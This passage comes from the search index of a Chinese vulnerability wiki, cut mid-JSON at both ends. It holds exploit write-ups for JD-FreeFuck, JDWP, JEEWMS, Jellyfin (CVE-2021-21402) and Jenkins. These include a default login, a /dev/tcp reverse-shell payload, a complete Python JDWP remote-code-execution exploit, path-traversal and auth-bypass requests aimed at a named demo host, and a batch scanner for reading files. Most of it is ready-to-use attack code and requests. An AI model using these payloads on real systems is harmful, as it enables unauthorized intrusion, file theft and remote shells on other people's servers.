"},"Web安全/JD-FreeFuck/JD-FreeFuck后台命令执行漏洞/JD-FreeFuck后台命令执行漏洞.html":{"url":"Web安全/JD-FreeFuck/JD-FreeFuck后台命令执行漏洞/JD-FreeFuck后台命令执行漏洞.html","title":"JD-FreeFuck后台命令执行漏洞","keywords":"","body":"JD-FreeFuck 后台命令执行漏洞 漏洞描述 JD-FreeFuck 存在后台命令执行漏洞，由于传参执行命令时没有对内容过滤，导致可以执行任意命令，控制服务器 项目地址： https://github.com/meselson/JD-FreeFuck 漏洞影响 JD-FreeFuck FOFA title=\"京东薅羊毛控制面板\" 漏洞复现 访问后登录页面如下 默认账号密码为 useradmin/supermanito 发送如下请求包执行命令 POST /runCmd HTTP/1.1 Host: 101.200.189.251:5678 Content-Length: 50 Pragma: no-cache Cache-Control: no-cache Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: connect.0.6356777726800276=s%3Av1W6DxlSqnPpVgvMCItxElFeKI1Psh4i.eE4ORs0Yz30N0TOg1pUVpOqrpIHyrqIimuXJVO8lE7U Connection: close cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&delay=500 其中 cmd 参数存在命令注入 反弹shell cmd=bash+jd.sh+%3Bbash+-c+'exec+bash+-i+%26%3E%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999+%3C%261'%3B+now&delay=500 参考文章 @桃花心 师傅 https://www.secquan.org/Discuss/1071932#reply3 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:12 "},"Web安全/JDWP/JDWP 远程代码执行漏洞/JDWP 远程代码执行漏洞.html":{"url":"Web安全/JDWP/JDWP 远程代码执行漏洞/JDWP 远程代码执行漏洞.html","title":"JDWP 远程代码执行漏洞","keywords":"","body":"JDWP 远程代码执行漏洞 一、漏洞简介 　JDWP 是 Java Debug Wire Protocol 的缩写，在JPDA（Java Platform Debugger Architecture）中，它定义了调试器（debugger）和被调试的 Java 虚拟机（target vm）之间的通信协议。与PHP的 Xdebug 类似，当其调试端口直接开放在公网上时，很容易被攻击者攻击并且获取系统权限。 二、漏洞影响 开启了JDWP服务的主机。 三、复现过程 利用dnslog确定可以执行命令： 执行结果： 生成msf后门文件，并将其放入自己的web目录下： 执行命令，让目标主机下载后门： 设置msf,让其处于监听状态： 给予后门可执行的权限，并执行后门： 查看msf反弹shell情况： 这个时候session已经成功创建，但是没办法正常出现meterpreter终端。这个时候需要ctrl+c，然后用sessions 1来使用创建的session。 ps 　　1、不要直接反弹shell，弹不过来的。 　　2、在使用Msf生成后门反弹的时候，往往会卡在\"session 1 opend\"，这个时候使用ctrl + c强制退出，然后使用session 1，选择session即可解决。 　　3、JDWP的端口是随机选择的，所以在探测的时候要选择全端口。具体判断的时候nmap可以判断出来， Java Debug Wire Protocol (Reference Imp lementation)version 1.8 1.8.0 181，这个是我遇到的那个服务版本。 poc import socket import time import sys import struct import urllib import argparse ################################################################################ # # JDWP protocol variables # HANDSHAKE = \"JDWP-Handshake\" REQUEST_PACKET_TYPE = 0x00 REPLY_PACKET_TYPE = 0x80 # Command signatures VERSION_SIG = (1, 1) CLASSESBYSIGNATURE_SIG = (1, 2) ALLCLASSES_SIG = (1, 3) ALLTHREADS_SIG = (1, 4) IDSIZES_SIG = (1, 7) CREATESTRING_SIG = (1, 11) SUSPENDVM_SIG = (1, 8) RESUMEVM_SIG = (1, 9) SIGNATURE_SIG = (2, 1) FIELDS_SIG = (2, 4) METHODS_SIG = (2, 5) GETVALUES_SIG = (2, 6) CLASSOBJECT_SIG = (2, 11) INVOKESTATICMETHOD_SIG = (3, 3) REFERENCETYPE_SIG = (9, 1) INVOKEMETHOD_SIG = (9, 6) STRINGVALUE_SIG = (10, 1) THREADNAME_SIG = (11, 1) THREADSUSPEND_SIG = (11, 2) THREADRESUME_SIG = (11, 3) THREADSTATUS_SIG = (11, 4) EVENTSET_SIG = (15, 1) EVENTCLEAR_SIG = (15, 2) EVENTCLEARALL_SIG = (15, 3) # Other codes MODKIND_COUNT = 1 MODKIND_THREADONLY = 2 MODKIND_CLASSMATCH = 5 MODKIND_LOCATIONONLY = 7 EVENT_BREAKPOINT = 2 SUSPEND_EVENTTHREAD = 1 SUSPEND_ALL = 2 NOT_IMPLEMENTED = 99 VM_DEAD = 112 INVOKE_SINGLE_THREADED = 2 TAG_OBJECT = 76 TAG_STRING = 115 TYPE_CLASS = 1 MODKIND_STEP = 10 EVENTKIND_STEP = 1 STEP_MIN = 0 STEP_INTO = 0 ################################################################################ # # JDWP client class # class JDWPClient: def __init__(self, host, port=8000): self.host = host self.port = port self.methods = {} self.fields = {} self.id = 0x01 return def create_packet(self, cmdsig, data=\"\"): flags = 0x00 cmdset, cmd = cmdsig pktlen = len(data) + 11 pkt = struct.pack(\">IIccc\", pktlen, self.id, chr(flags), chr(cmdset), chr(cmd)) pkt+= data self.id += 2 return pkt def read_reply(self): header = self.socket.recv(11) pktlen, id, flags, errcode = struct.unpack(\">IIcH\", header) if flags == chr(REPLY_PACKET_TYPE): if errcode : raise Exception(\"Received errcode %d\" % errcode) buf = \"\" while len(buf) + 11 I\", buf[:4])[0] buf = buf[4:] else: nb_entries = 1 for i in range(nb_entries): data = {} for fmt, name in formats: if fmt == \"L\" or fmt == 8: data[name] = int(struct.unpack(\">Q\",buf[index:index+8]) [0]) index += 8 elif fmt == \"I\" or fmt == 4: data[name] = int(struct.unpack(\">I\", buf[index:index+4])[0]) index += 4 elif fmt == 'S': l = struct.unpack(\">I\", buf[index:index+4])[0] data[name] = buf[index+4:index+4+l] index += 4+l elif fmt == 'C': data[name] = ord(struct.unpack(\">c\", buf[index])[0]) index += 1 elif fmt == 'Z': t = ord(struct.unpack(\">c\", buf[index])[0]) if t == 115: s = self.solve_string(buf[index+1:index+9]) data[name] = s index+=9 elif t == 73: data[name] = struct.unpack(\">I\", buf[index+1:index+5])[0] buf = struct.unpack(\">I\", buf[index+5:index+9]) index=0 else: print \"Error\" sys.exit(1) entries.append( data ) return entries def format(self, fmt, value): if fmt == \"L\" or fmt == 8: return struct.pack(\">Q\", value) elif fmt == \"I\" or fmt == 4: return struct.pack(\">I\", value) raise Exception(\"Unknown format\") def unformat(self, fmt, value): if fmt == \"L\" or fmt == 8: return struct.unpack(\">Q\", value[:8])[0] elif fmt == \"I\" or fmt == 4: return struct.unpack(\">I\", value[:4])[0] else: raise Exception(\"Unknown format\") return def start(self): self.handshake(self.host, self.port) self.idsizes() self.getversion() self.allclasses() return def handshake(self, host, port): s = socket.socket() try: s.connect( (host, port) ) except socket.error as msg: raise Exception(\"Failed to connect: %s\" % msg) s.send( HANDSHAKE ) if s.recv( len(HANDSHAKE) ) != HANDSHAKE: raise Exception(\"Failed to handshake\") else: self.socket = s return def leave(self): self.socket.close() return def getversion(self): self.socket.sendall( self.create_packet(VERSION_SIG) ) buf = self.read_reply() formats = [ ('S', \"description\"), ('I', \"jdwpMajor\"), ('I', \"jdwpMinor\"), ('S', \"vmVersion\"), ('S', \"vmName\"), ] for entry in self.parse_entries(buf, formats, False): for name,value in entry.iteritems(): setattr(self, name, value) return @property def version(self): return \"%s - %s\" % (self.vmName, self.vmVersion) def idsizes(self): self.socket.sendall( self.create_packet(IDSIZES_SIG) ) buf = self.read_reply() formats = [ (\"I\", \"fieldIDSize\"), (\"I\", \"methodIDSize\"), (\"I\", \"objectIDSize\"), (\"I\", \"referenceTypeIDSize\"), (\"I\", \"frameIDSize\") ] for entry in self.parse_entries(buf, formats, False): for name,value in entry.iteritems(): setattr(self, name, value) return def allthreads(self): try: getattr(self, \"threads\") except : self.socket.sendall( self.create_packet(ALLTHREADS_SIG) ) buf = self.read_reply() formats = [ (self.objectIDSize, \"threadId\")] self.threads = self.parse_entries(buf, formats) finally: return self.threads def get_thread_by_name(self, name): self.allthreads() for t in self.threads: threadId = self.format(self.objectIDSize, t[\"threadId\"]) self.socket.sendall( self.create_packet(THREADNAME_SIG, data=threadId) ) buf = self.read_reply() if len(buf) and name == self.readstring(buf): return t return None def get_name_by_threadId(self, threadId): threadId = self.format(self.objectIDSize, threadId) self.socket.sendall( self.create_packet(THREADNAME_SIG, data=threadId) ) buf = self.read_reply() formats = [ ('S', \"name\") ] buf = self.parse_entries(buf, formats, False) return buf[0]['name'] def allclasses(self): try: getattr(self, \"classes\") except: self.socket.sendall( self.create_packet(ALLCLASSES_SIG) ) buf = self.read_reply() formats = [ ('C', \"refTypeTag\"), (self.referenceTypeIDSize, \"refTypeId\"), ('S', \"signature\"), ('I', \"status\")] self.classes = self.parse_entries(buf, formats) return self.classes def get_class_by_name(self, name): for entry in self.classes: if entry[\"signature\"].lower() == name.lower() : return entry return None def get_methods(self, refTypeId): if not self.methods.has_key(refTypeId): refId = self.format(self.referenceTypeIDSize, refTypeId) self.socket.sendall( self.create_packet(METHODS_SIG, data=refId) ) buf = self.read_reply() formats = [ (self.methodIDSize, \"methodId\"), ('S', \"name\"), ('S', \"signature\"), ('I', \"modBits\")] self.methods[refTypeId] = self.parse_entries(buf, formats) return self.methods[refTypeId] def get_method_by_name(self, name): for refId in self.methods.keys(): for entry in self.methods[refId]: if entry[\"name\"].lower() == name.lower() : return entry return None def getfields(self, refTypeId): if not self.fields.has_key( refTypeId ): refId = self.format(self.referenceTypeIDSize, refTypeId) self.socket.sendall( self.create_packet(FIELDS_SIG, data=refId) ) buf = self.read_reply() formats = [ (self.fieldIDSize, \"fieldId\"), ('S', \"name\"), ('S', \"signature\"), ('I', \"modbits\")] self.fields[refTypeId] = self.parse_entries(buf, formats) return self.fields[refTypeId] def getvalue(self, refTypeId, fieldId): data = self.format(self.referenceTypeIDSize, refTypeId) data+= struct.pack(\">I\", 1) data+= self.format(self.fieldIDSize, fieldId) self.socket.sendall( self.create_packet(GETVALUES_SIG, data=data) ) buf = self.read_reply() formats = [ (\"Z\", \"value\") ] field = self.parse_entries(buf, formats)[0] return field def createstring(self, data): buf = self.buildstring(data) self.socket.sendall( self.create_packet(CREATESTRING_SIG, data=buf) ) buf = self.read_reply() return self.parse_entries(buf, [(self.objectIDSize, \"objId\")], False) def buildstring(self, data): return struct.pack(\">I\", len(data)) + data def readstring(self, data): size = struct.unpack(\">I\", data[:4])[0] return data[4:4+size] def suspendvm(self): self.socket.sendall( self.create_packet( SUSPENDVM_SIG ) ) self.read_reply() return def resumevm(self): self.socket.sendall( self.create_packet( RESUMEVM_SIG ) ) self.read_reply() return def invokestatic(self, classId, threadId, methId, *args): data = self.format(self.referenceTypeIDSize, classId) data+= self.format(self.objectIDSize, threadId) data+= self.format(self.methodIDSize, methId) data+= struct.pack(\">I\", len(args)) for arg in args: data+= arg data+= struct.pack(\">I\", 0) self.socket.sendall( self.create_packet(INVOKESTATICMETHOD_SIG, data=data) ) buf = self.read_reply() return buf def invoke(self, objId, threadId, classId, methId, *args): data = self.format(self.objectIDSize, objId) data+= self.format(self.objectIDSize, threadId) data+= self.format(self.referenceTypeIDSize, classId) data+= self.format(self.methodIDSize, methId) data+= struct.pack(\">I\", len(args)) for arg in args: data+= arg data+= struct.pack(\">I\", 0) self.socket.sendall( self.create_packet(INVOKEMETHOD_SIG, data=data) ) buf = self.read_reply() return buf def solve_string(self, objId): self.socket.sendall( self.create_packet(STRINGVALUE_SIG, data=objId) ) buf = self.read_reply() if len(buf): return self.readstring(buf) else: return \"\" def query_thread(self, threadId, kind): data = self.format(self.objectIDSize, threadId) self.socket.sendall( self.create_packet(kind, data=data) ) buf = self.read_reply() return buf def suspend_thread(self, threadId): return self.query_thread(threadId, THREADSUSPEND_SIG) def status_thread(self, threadId): buf = self.query_thread(threadId, THREADSTATUS_SIG) formats = [ ('I', \"threadStatus\"), ('I','suspendStatus')] threadStatus = cli.parse_entries(buf, formats, False) return threadStatus def resume_thread(self, threadId): return self.query_thread(threadId, THREADRESUME_SIG) def send_event(self, eventCode, *args): data = \"\" data+= chr( eventCode ) data+= chr( SUSPEND_ALL ) data+= struct.pack(\">I\", len(args)) for kind, option in args: data+= chr( kind ) data+= option self.socket.sendall( self.create_packet(EVENTSET_SIG, data=data) ) buf = self.read_reply() return struct.unpack(\">I\", buf)[0] def clear_event(self, eventCode, rId): data = chr(eventCode) data+= struct.pack(\">I\", rId) self.socket.sendall( self.create_packet(EVENTCLEAR_SIG, data=data) ) self.read_reply() return def clear_events(self): self.socket.sendall( self.create_packet(EVENTCLEARALL_SIG) ) self.read_reply() return def wait_for_event(self): buf = self.read_reply() return buf def parse_event(self, buf, eventId): num = struct.unpack(\">I\", buf[2:6])[0] rId = struct.unpack(\">I\", buf[6:10])[0] if rId != eventId: return None tId = self.unformat(self.objectIDSize, buf[10:10+self.objectIDSize]) loc = -1 # don't care return rId, tId, loc def runtime_exec(jdwp): # 1. get Runtime class reference runtimeClass = jdwp.get_class_by_name(\"Ljava/lang/Runtime;\") if runtimeClass is None: print (\"[-] Cannot find class Runtime\") return False print (\"[+] Found Runtime class: id=%x\" % runtimeClass[\"refTypeId\"]) # 2. get getRuntime() meth reference jdwp.get_methods(runtimeClass[\"refTypeId\"]) getRuntimeMeth = jdwp.get_method_by_name(\"getRuntime\") if getRuntimeMeth is None: print (\"[-] Cannot find method Runtime.getRuntime()\") return False print (\"[+] Found Runtime.getRuntime(): id=%x\" % getRuntimeMeth[\"methodId\"]) # 3. setup 'step into' event threads = jdwp.allthreads() for thread in threads: threadStatus = jdwp.status_thread(thread['threadId']) threadStatus = threadStatus[0][\"threadStatus\"] if threadStatus == 2: #Sleeping threadId = thread['threadId'] break if \"threadId\" not in dir(): print(\"Could not find a suitable thread for stepping\") exit() print(\"[+] Setting 'step into' event in thread: %s\" % threadId) jdwp.suspendvm() step_info = jdwp.format(jdwp.objectIDSize, threadId) step_info += struct.pack(\">I\",STEP_MIN) step_info += struct.pack(\">I\",STEP_INTO) data = [ (MODKIND_STEP, step_info), ] rId = jdwp.send_event(EVENTKIND_STEP, *data) # 4. resume vm and wait for event jdwp.resumevm() while True: buf = jdwp.wait_for_event() ret = jdwp.parse_event(buf, rId) if ret is not None: break rId, tId, loc = ret print (\"[+] Received matching event from thread %#x\" % tId) jdwp.clear_event(EVENTKIND_STEP, rId) # 5. Now we can execute any code runtime_exec_payload(jdwp, tId, runtimeClass[\"refTypeId\"], getRuntimeMeth[\"methodId\"], args.cmd) jdwp.resumevm() print (\"[!] Command successfully executed\") return True def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, command): # # This function will invoke command as a payload, which will be running # with JVM privilege on host (intrusive). # print (\"[+] Selected payload '%s'\" % command) # 1. allocating string containing our command to exec() cmdObjIds = jdwp.createstring( command ) if len(cmdObjIds) == 0: print (\"[-] Failed to allocate command\") return False cmdObjId = cmdObjIds[0][\"objId\"] print (\"[+] Command string object created id:%x\" % cmdObjId) # 2. use context to get Runtime object buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId) if buf[0] != chr(TAG_OBJECT): print (\"[-] Unexpected returned type: expecting Object\") return False rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize]) if rt is None: print \"[-] Failed to invoke Runtime.getRuntime()\" return False print (\"[+] Runtime.getRuntime() returned context id:%#x\" % rt) # 3. find exec() method execMeth = jdwp.get_method_by_name(\"exec\") if execMeth is None: print (\"[-] Cannot find method Runtime.exec()\") return False print (\"[+] found Runtime.exec(): id=%x\" % execMeth[\"methodId\"]) # 4. call exec() in this context with the alloc-ed string data = [ chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmdObjId) ] buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth[\"methodId\"], *data) if buf[0] != chr(TAG_OBJECT): print (\"[-] Unexpected returned type: expecting Object\") return False retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize]) print (\"[+] Runtime.exec() successful, retId=%x\" % retId) return True if __name__ == \"__main__\": parser = argparse.ArgumentParser(description=\"Universal exploitation script for JDWP by @Lz1y, base on @_hugsy_\", formatter_class=argparse.ArgumentDefaultsHelpFormatter ) parser.add_argument(\"-t\", \"--target\", type=str, metavar=\"IP\", help=\"Remote target IP\", required=True) parser.add_argument(\"-p\", \"--port\", type=int, metavar=\"PORT\", default=8000, help=\"Remote target port\") parser.add_argument(\"-c\", \"--cmd\", dest=\"cmd\", type=str, metavar=\"COMMAND\", help=\"Specify command to execute remotely\") args = parser.parse_args() cli = JDWPClient(args.target, args.port) try: cli.start() except: print(\"Handshake failed!\") #print vm description print \"[+] Dump vm description \\n\", cli.description, \"\\n\" runtime_exec(cli) cli.leave() 参考链接 https://www.cnblogs.com/sq-smile/protected/p/13172831.html https://github.com/Lz1y/jdwp-shellifier Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:14 "},"Web安全/JEEWMS/JEEWMS存在命令执行漏洞/JEEWMS存在命令执行漏洞.html":{"url":"Web安全/JEEWMS/JEEWMS存在命令执行漏洞/JEEWMS存在命令执行漏洞.html","title":"JEEWMS存在命令执行漏洞","keywords":"","body":"JEEWMS存在命令执行漏洞 漏洞描述 JEEWMS存在命令执行漏洞 漏洞影响 JEEWMS全版本 FOFA body=\"plug-in/lhgDialog/lhgdialog.min.js?skin=metro\" && body=\"仓\" 漏洞复现 漏洞详情： \\1. 漏洞代码位置 pom.xml文件中使用commons-collections.version版本3.2.1，可进行反序列化命令执行 mysql版本5.1.27，可进行jdbc反序列化 \\2. 漏洞代码分析 src/main/java/org/jeecgframework/web/system/controller/core/DynamicDataSourceController.java 此控制器可传入数据库jdbc url、用户名、密码，因此存在jdbc反序列化漏洞 DynamicDataSourceEntity内容：src/main/java/org/jeecgframework/web/system/pojo/base/DynamicDataSourceEntity.java 已知jdbc url可控，存在jdbc反序列化漏洞，无害验证如下 启动虚假mysql服务器 发送payload（此处使用了授权绕过漏洞 ,在上文) 在url中使用/rest/../绕过登录授权 发送反序列化payload 收到dnslog请求 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:16 "},"Web安全/JEEWMS/JEEWMS存在未授权任意文件读取漏洞/JEEWMS存在未授权任意文件读取漏洞.html":{"url":"Web安全/JEEWMS/JEEWMS存在未授权任意文件读取漏洞/JEEWMS存在未授权任意文件读取漏洞.html","title":"JEEWMS存在未授权任意文件读取漏洞","keywords":"","body":"JEEWMS存在未授权任意文件读取漏洞 漏洞描述 JEEWMS存在未授权任意文件读取漏洞 漏洞影响 JEEWMS全版本 FOFA body=\"plug-in/lhgDialog/lhgdialog.min.js?skin=metro\" && body=\"仓\" 漏洞复现 漏洞代码： org.jeecgframework.web.system.controller.core.SystemController 可以看到dbpath可被控制，最终读取路径为：系统配置路径+dbpath 这样的读取方式可被../../控制路径，造成任意文件读取，同时该接口未做权限验证，可未授权任意文件读取 POC: http://x.x.x.x:8088/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini http://x.x.x.x:8020/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:20 "},"Web安全/JEEWMS/JEEWMS存在权限绕过漏洞/JEEWMS存在权限绕过漏洞.html":{"url":"Web安全/JEEWMS/JEEWMS存在权限绕过漏洞/JEEWMS存在权限绕过漏洞.html","title":"JEEWMS存在权限绕过漏洞","keywords":"","body":"JEEWMS存在权限绕过漏洞 漏洞描述 JEEWMS存在权限绕过漏洞 漏洞影响 JEEWMS全版本 FOFA body=\"plug-in/lhgDialog/lhgdialog.min.js?skin=metro\" && body=\"仓\" 漏洞复现 漏洞代码： org.jeecgframework.core.interceptors.AuthInterceptor jeewms使用JAVA拦截器做的权限控制，存在被绕过漏洞 代码： 可以看到第一个if判断中只要0-5个字符串是rest/就返回true，意思是无需认证 由于测试站放在站群上，因此POC是/wmstest/rest/../正常/rest/../即可 正常数据包： 删除Cookie数据包 使用POC数据包 payload POST /wmstest/rest/../BiController.do?dayCount&reportType=line HTTP/1.1 Host: www.jeewms.cn Content-Length: 0 Accept: */* User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Edg/85.0.564.63 X-Requested-With: XMLHttpRequest Origin: http://www.jeewms.cn Referer: http://www.jeewms.cn/wmstest/BiController.do?homebi Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5 Connection: close POST /wmstest/rest/../userController.do?datagrid&field=id,userName,realName,userOrgList.tsDepart.departname,userKey,createBy,createDate,updateBy,updateDate,status, HTTP/1.1 Host: www.jeewms.cn Content-Length: 58 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Edg/85.0.564.63 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://www.jeewms.cn Referer: http://www.jeewms.cn/wmstest/userController.do?user&clickFunctionId=8a8ab0b246dc81120146dc8180df001f Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5 Connection: close page=1&rows=10&sort=createDate%2CuserName&order=asc%2Cdesc Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:21 "},"Web安全/Jellyfin/Jellyfin 任意文件读取漏洞 CVE-2021-21402/Jellyfin 任意文件读取漏洞 CVE-2021-21402.html":{"url":"Web安全/Jellyfin/Jellyfin 任意文件读取漏洞 CVE-2021-21402/Jellyfin 任意文件读取漏洞 CVE-2021-21402.html","title":"Jellyfin 任意文件读取漏洞 CVE-2021-21402","keywords":"","body":"Jellyfin 任意文件读取漏洞 CVE-2021-21402 漏洞描述 Jellyfin是一个免费软件媒体系统。在10.7.1版之前的Jellyfin中，带有某些终结点的精心设计的请求将允许从Jellyfin服务器的文件系统中读取任意文件。当Windows用作主机OS时，此问题更为普遍。暴露于公共Internet的服务器可能会受到威胁。在版本10.7.1中已修复此问题。解决方法是，用户可以通过在文件系统上实施严格的安全权限来限制某些访问，但是建议尽快进行更新。 漏洞影响 [!NOTE] Jellyfin FOFA [!NOTE] title='Jellyfin' || body='http://jellyfin.media' 漏洞复现 无论是/Audio/{Id}/hls/{segmentId}/stream.mp3和/Audio/{Id}/hls/{segmentId}/stream.aac路线允许任意文件在Windows上读取。可以{segmentId}使用Windows路径分隔符\\（对%5CURL进行编码）将路由的一部分设置为相对或绝对路径。最初，攻击者似乎只能读取以.mp3和.aac结尾的文件。但是，通过在URL路径中使用斜杠 Path.GetExtension(Request.Path)返回一个空扩展名，从而获得对结果文件路径的完全控制。的itemId，因为它没有使用也没有关系。该问题不仅限于Jellyfin文件，因为它允许从文件系统读取任何文件。 // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] // [1] [HttpGet(\"Audio/{itemId}/hls/{segmentId}/stream.mp3\", Name = \"GetHlsAudioSegmentLegacyMp3\")] [HttpGet(\"Audio/{itemId}/hls/{segmentId}/stream.aac\", Name = \"GetHlsAudioSegmentLegacyAac\")] //... public ActionResult GetHlsAudioSegmentLegacy([FromRoute, Required] string itemId, [FromRoute, Required] string segmentId) { // TODO: Deprecate with new iOS app var file = segmentId + Path.GetExtension(Request.Path); //[2] file = Path.Combine(_serverConfigurationManager.GetTranscodePath(), file); return FileStreamResponseHelpers.GetStaticFileResult(file, MimeTypes.GetMimeType(file)!, false, HttpContext); } 使用如下请求将会读取带有密码的数据库文件 http://xxx.xxx.xxx.xxx /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ 另一处代码如下 // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] //[1] [HttpGet(\"Videos/{itemId}/hls/{playlistId}/{segmentId}.{segmentContainer}\")] //... public ActionResult GetHlsVideoSegmentLegacy( [FromRoute, Required] string itemId, [FromRoute, Required] string playlistId, [FromRoute, Required] string segmentId, [FromRoute, Required] string segmentContainer) { var file = segmentId + Path.GetExtension(Request.Path); //[2] var transcodeFolderPath = _serverConfigurationManager.GetTranscodePath(); file = Path.Combine(transcodeFolderPath, file); //[3] var normalizedPlaylistId = playlistId; var filePaths = _fileSystem.GetFilePaths(transcodeFolderPath); // Add . to start of segment container for future use. segmentContainer = segmentContainer.Insert(0, \".\"); string? playlistPath = null; foreach (var path in filePaths) { var pathExtension = Path.GetExtension(path); if ((string.Equals(pathExtension, segmentContainer, StringComparison.OrdinalIgnoreCase) || string.Equals(pathExtension, \".m3u8\", StringComparison.OrdinalIgnoreCase)) //[4] && path.IndexOf(normalizedPlaylistId, StringComparison.OrdinalIgnoreCase) != -1) //[5] { playlistPath = path; break; } } return playlistPath == null ? NotFound(\"Hls segment not found.\") : GetFileResult(file, playlistPath); } 该/Videos/{Id}/hls/{PlaylistId}/{SegmentId}.{SegmentContainer}路由允许在Windows上读取未经身份验证的任意文件。可以{SegmentId}.{SegmentContainer}使用Windows路径分隔符\\（对%5CURL进行编码）将路由的一部分设置为相对或绝对路径。在SegmentId从和文件扩展名Path被级联。结果file用作Path.Combine[3]的第二个参数。但是，如果第二个参数是绝对路径，则第一个参数to将Path.Combine被忽略，而得到的路径仅是绝对路径file。 POC如下，下载同样的文件 http://xxx.xxx.xxx.xxx/Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db 如上为证明漏洞存在和可利用性，详情链接参考 https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/ 漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Jellyfin >> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=2) if response.status_code == 200 and \"file\" in response.text and \"extension\" in response.text and \"font\" in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞(读取 windows/win.ini), 链接为:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] 请求报错 \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Jellyfin 10.7.0 Unauthenticated Abritrary File Read CVE-2021-21402 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:24 "},"Web安全/Jenkins/（CVE-2017-1000353）Jenkins-CI 远程代码执行漏洞/（CVE-2017-1000353）Jenkins-CI 远程代码执行漏洞.html":{"url":"Web安全/Jenkins/（CVE-2017-1000353）Jenkins-CI 远程代码执行漏洞/（CVE-2017-1000353）Jenkins-CI 远程代码执行漏洞.html","title":"（CVE-2017-1000353）Jenkins-CI 远程代码执行漏洞","keywords":"","body":"（CVE-2017-1000353）Jenkins-CI 远程代码执行漏洞 一、漏洞简介 该漏洞存在于使用HTTP协议的双向通信通道的具体实现代码中，Jenkins利用此通道来接收命令，恶意攻击者可以构造恶意攻击参数远程执行命令，从而获取系统权限，造成数据泄露。 二、漏洞影响 所有Jenkins主版本均受到影响(包括\\ 三、复现过程 步骤一、生成序列化字符串 参考https://github.com/ianxtianxt/CVE-2017-1000353，首先下载CVE-2017-1000353-1.1-SNAPSHOT-all.jar，这是生成POC的工具。 执行下面命令，生成字节码文件： java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser \"touch /tmp/success\" # jenkins_poc.ser是生成的字节码文件名 # \"touch ...\"是待执行的任意命令 执行上述代码后，生成jenkins_poc.ser文件，这就是序列化字符串。 步骤二、发送数据包，执行命令 下载exploit.py，python3执行python exploit.py http://www.0-sec.org:8080 jenkins_poc.ser，将刚才生成的字节码文件发送给目标： Jenkins-CI远程代码执行漏洞/media/rId29.jpg) 进入docker，发现/tmp/success成功被创建，说明命令执行漏洞利用成功： Jenkins-CI远程代码执行漏洞/media/rId30.jpg) 参考链接 https://vulhub.org/\\#/environments/jenkins/CVE-2017-1000353/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:26 "},"Web安全/Jenkins/（CVE-2018-1000861）Jenkins 远程命令执行漏洞/（CVE-2018-1000861）Jenkins 远程命令执行漏洞.html":{"url":"Web安全/Jenkins/（CVE-2018-1000861）Jenkins 